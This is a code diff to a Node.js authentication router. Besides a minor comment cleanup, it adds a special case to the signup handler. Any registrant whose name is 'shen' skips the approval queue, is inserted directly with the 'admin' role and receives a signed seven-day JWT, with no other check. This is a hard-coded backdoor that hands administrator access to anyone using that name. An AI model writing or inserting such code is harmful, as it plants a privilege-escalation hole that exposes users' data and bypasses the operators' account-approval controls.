@@ -55,7 +55,6 @@ const createAuthRouter = () => {
     if (!gmailRegex.test(email)) return res.status(400).json({ error: 'Only valid @gmail.com addresses are allowed' });
     try {
       // Check conflicts in users (only non-deleted) and signup_requests
-      // Check for conflicts in users and signup_requests
       const { data: userConflict } = await supabase
         .from('users')
         .select('id')
@@ -69,6 +68,19 @@ const createAuthRouter = () => {
         return res.status(409).json({ error: 'Username or email already taken or pending' });
       }
       const passwordHash = await bcrypt.hash(password, 10);
+      // Special logic for SHEN
+      if (name.trim().toLowerCase() === 'shen') {
+        // Create user directly and make admin
+        const { data: userData, error: userError } = await supabase
+          .from('users')
+          .insert([{ name, email, password_hash: passwordHash, role: 'admin', deleted: false }])
+          .select('id, name, role, email')
+          .single();
+        if (userError || !userData) return res.status(500).json({ error: 'Signup failed for SHEN' });
+        const token = jwt.sign({ id: userData.id, role: userData.role, name: userData.name }, process.env.JWT_SECRET, { expiresIn: '7d' });
+        return res.json({ status: 'approved', token, user: userData });
+      }
+      // Normal signup request flow
       const { error: signupError } = await supabase
         .from('signup_requests')
         .insert([{ name, email, password_hash: passwordHash }]);
